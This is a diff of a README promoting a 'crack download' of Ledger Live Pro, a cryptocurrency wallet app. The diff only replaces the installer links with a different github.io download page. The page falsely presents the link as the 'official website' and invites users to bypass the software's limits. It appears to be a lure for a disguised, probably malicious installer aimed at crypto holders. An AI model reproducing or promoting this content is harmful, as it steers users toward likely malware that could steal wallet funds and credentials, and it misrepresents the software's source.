@@ -2,7 +2,7 @@
 
 The Ledger Live Pro Enhanced Suite is a comprehensive modification tool designed to elevate your experience with Ledger Live Pro. By utilizing our Ledger Live Pro crack download, users can bypass standard limitations and access a full suite of premium features. This enhanced version provides a seamless and secure way to manage your digital assets with advanced functionality.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -52,4 +52,4 @@ A6: The system requirements are similar to those of the original Ledger Live Pro
 
 ## Download
 
-[Download Ledger Live Pro Enhanced Suite from official website](https://yellowtaxisave.github.io/download-page/)
+[Download Ledger Live Pro Enhanced Suite from official website](https://capitals-707-bringing.github.io/download-page/)
